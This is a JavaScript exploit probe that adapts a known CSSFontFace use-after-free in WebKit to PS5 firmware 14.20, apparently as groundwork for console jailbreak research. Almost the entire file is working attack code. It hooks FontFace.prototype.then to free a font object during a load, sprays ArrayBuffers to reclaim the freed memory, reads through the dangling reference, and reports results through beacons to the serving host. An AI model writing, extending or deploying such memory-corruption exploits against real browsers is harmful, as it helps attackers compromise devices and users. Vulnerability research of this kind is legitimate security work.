// p197 — CSSFontFace UAF adapted for PS5 14.20 (WebKit-1200)
//
// The ntfargo/CSSFontFace-Exploit uses a thenable hook on FontFace.prototype
// to free a CSSFontFace during FontFaceSet::load, then spray ArrayBuffers
// at sizeof(CSSFontFace) to reclaim. The dangling FontFace JS object lets
// us read controlled memory through featureSettings property.
//
// On PS5 9.00+, m_propertiesOrCSSConnection replaced the direct property
// accessors, so featureSettings as read primitive is dead. BUT:
//
// 1. The UAF itself may still work (the FontFaceSet::load thenable trick)
// 2. Even without featureSettings read, a reclaimed FontFace gives us
//    a controlled native object accessible from JS
// 3. Other property accessors (family, style, weight, unicodeRange,
//    display, etc.) may read from controllable offsets
// 4. On PS5 14.20, CSSFontFace is larger due to m_propertiesOrCSSConnection
//    but the UAF mechanism is the same
//
// This probe tests:
// - Whether the thenable trick works on PS5 WebKit-1200
// - Whether ArrayBuffer spray successfully reclaims
// - What property values we can read from the dangling reference
// - Any crash or corruption signal
//
// Beacon prefix: V197-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V197-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Check FontFace + document.fonts
  var hasFF = (typeof FontFace !== 'undefined');
  var hasFonts = !!(document.fonts && document.fonts.load);
  syncB('FF-' + (hasFF ? 'Y' : 'N') + '-FS-' + (hasFonts ? 'Y' : 'N'));

  if (!hasFF || !hasFonts) {
    syncB('ABORT-NO-FONTFACE');
    return;
  }

  // Test CSSFontFace sizeof by trying multiple spray sizes
  // PS5 14.20 CSSFontFace likely 0x100-0x180 (256-384 bytes)
  // We try a range
  var SIZES = [128, 160, 192, 224, 256, 288, 320, 352, 384];
  var SPRAY_COUNT = 0xB0; // Same as ntfargo
  var MARKER_LO = 0xCAFE1234;
  var attempts = 0;
  var MAX_ATTEMPTS = 10;
  var alive = true;

  function attempt() {
    if (!alive || attempts >= MAX_ATTEMPTS) {
      syncB('DONE-ATT' + attempts);
      return;
    }
    attempts++;
    syncB('ATT-' + attempts);

    // For each attempt, try a different spray size
    var targetSize = SIZES[attempts % SIZES.length];
    syncB('TRY-SZ' + targetSize);

    var abs = new Array(SPRAY_COUNT);
    var style = document.createElement('style');
    document.head.appendChild(style);

    // FontFace A: local source, resolves synchronously
    var A;
    try {
      A = new FontFace("a" + attempts, "local(Helvetica)", { unicodeRange: "U+0041" });
      document.fonts.add(A);
    } catch(e) {
      syncB('ERR-A-' + (e.message || '').substring(0, 25));
      style.remove();
      setTimeout(attempt, 10);
      return;
    }

    // Register a DeferredPromise on A
    void A.loaded;

    // Shape heap: spray font rules around B
    var sprayRule = '@font-face { font-family: spray' + attempts + '; src: local(Helvetica Bold); unicode-range: U+0043; }';
    for (var i = 0; i < SPRAY_COUNT / 4; i++) {
      try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); } catch(x) {}
    }

    // FontFace B: remote source (nonexistent), resolves async
    var uafRule = '@font-face { font-family: b' + attempts + '; src: url(NONEXIST' + attempts + '.woff); unicode-range: U+0042; }';
    var uafIdx;
    try {
      uafIdx = style.sheet.cssRules.length;
      style.sheet.insertRule(uafRule, uafIdx);
    } catch(e) {
      syncB('ERR-B-' + (e.message || '').substring(0, 25));
      style.remove();
      setTimeout(attempt, 10);
      return;
    }

    // More spray rules after B
    for (var i = SPRAY_COUNT / 4; i < SPRAY_COUNT; i++) {
      try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); } catch(x) {}
    }

    // Force style recalc to instantiate FontFaces
    document.body.offsetTop;

    syncB('ATT' + attempts + '-SETUP');

    // Override FontFace.prototype.then
    var oldThen = FontFace.prototype.then;

    Object.defineProperty(FontFace.prototype, "then", {
      configurable: true,
      get: function() {
        if (this === A) {
          syncB('ATT' + attempts + '-THEN');

          // Free B by deleting its CSS rule
          try { style.sheet.deleteRule(uafIdx); } catch(x) {}

          // Force style recalc to destroy B's CSSFontFace
          document.body.offsetTop;

          // Free spray neighbors
          var ruleCount = style.sheet.cssRules.length;
          for (var i = ruleCount - 1; i >= 0; i--) {
            try {
              if (style.sheet.cssRules[i].cssText.indexOf('spray') !== -1) {
                style.sheet.deleteRule(i);
              }
            } catch(x) {}
          }

          // Force recalc
          document.body.offsetTop;

          // Spray ArrayBuffers to reclaim B's CSSFontFace memory
          for (var i = 0; i < abs.length; i++) {
            var ab = new ArrayBuffer(targetSize);
            var view = new DataView(ab);
            // Ref count at offset 8 (set to 1 so it survives)
            view.setUint32(0, MARKER_LO, true);
            view.setUint32(4, 0, true);
            view.setUint32(8, 1, true); // ref count
            view.setUint32(12, 0, true);
            // Set status to Success (3) at various candidate offsets
            // PS5 m_status offset unknown, try common positions
            for (var off = 0x70; off <= 0x160; off += 0x10) {
              if (off < targetSize) {
                view.setUint8(off, 3); // Status::Success
              }
            }
            abs[i] = ab;
          }

          syncB('ATT' + attempts + '-SPRAY');
        }
        return undefined;
      }
    });

    // Load "AB" — needs both U+0041 (A, sync) and U+0042 (B, CSS rule)
    // A resolves sync, triggers the thenable getter above
    document.fonts.load('1em a' + attempts + ', b' + attempts, 'AB').then(function(fonts) {
      syncB('ATT' + attempts + '-LOADED-' + fonts.length);

      // Restore then
      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: oldThen
      });

      if (fonts.length === 2) {
        syncB('ATT' + attempts + '-UAF-OK');

        // Find the UAF font (B has default unicodeRange)
        var uafFont = null;
        for (var fi = 0; fi < fonts.length; fi++) {
          try {
            if (fonts[fi].unicodeRange === 'U+0-10FFFF') {
              uafFont = fonts[fi];
              break;
            }
          } catch(e) {}
        }

        if (uafFont) {
          syncB('ATT' + attempts + '-FOUND-UAF');

          // Try reading properties from the dangling FontFace
          try { syncB('P-FAM-' + (uafFont.family || 'null').substring(0, 20)); } catch(e) { syncB('P-FAM-ERR'); }
          try { syncB('P-STY-' + (uafFont.style || 'null').substring(0, 20)); } catch(e) { syncB('P-STY-ERR'); }
          try { syncB('P-WGT-' + (uafFont.weight || 'null').substring(0, 20)); } catch(e) { syncB('P-WGT-ERR'); }
          try { syncB('P-UNI-' + (uafFont.unicodeRange || 'null').substring(0, 20)); } catch(e) { syncB('P-UNI-ERR'); }
          try { syncB('P-DSP-' + (uafFont.display || 'null').substring(0, 20)); } catch(e) { syncB('P-DSP-ERR'); }
          try { syncB('P-STS-' + uafFont.status); } catch(e) { syncB('P-STS-ERR'); }
          try { syncB('P-FST-' + (uafFont.featureSettings || 'null').substring(0, 20)); } catch(e) { syncB('P-FST-ERR'); }
          try { syncB('P-VAR-' + (uafFont.variationSettings || 'null').substring(0, 20)); } catch(e) { syncB('P-VAR-ERR'); }

          // Check which ArrayBuffer was reclaimed
          for (var i = 0; i < abs.length; i++) {
            var v = new DataView(abs[i]);
            // Ref count should have been incremented from 1 to 2
            if (v.getUint32(8, true) === 2) {
              syncB('ATT' + attempts + '-RECLAIM-' + i);

              // Dump first 64 bytes
              var u8 = new Uint8Array(abs[i]);
              var hex = '';
              for (var j = 0; j < 64 && j < targetSize; j++) {
                hex += ('0' + u8[j].toString(16)).slice(-2);
              }
              syncB('RD-' + hex.substring(0, 60));
              if (hex.length > 60) syncB('RD2-' + hex.substring(60));
              break;
            }
          }
        } else {
          syncB('ATT' + attempts + '-NO-UAF-FONT');
        }
      } else {
        syncB('ATT' + attempts + '-FONTS-' + fonts.length);
      }

      // Clean up
      try { document.fonts.delete(A); } catch(x) {}
      style.remove();
      abs.length = 0;

      setTimeout(attempt, 100);

    }).catch(function(e) {
      syncB('ATT' + attempts + '-REJECT-' + (e.message || '').substring(0, 25));

      Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        value: oldThen
      });

      style.remove();
      abs.length = 0;
      setTimeout(attempt, 100);
    });
  }

  syncB('START');
  attempt();

  setTimeout(function() {
    alive = false;
    syncB('TIMEOUT');
  }, 60000);

})();
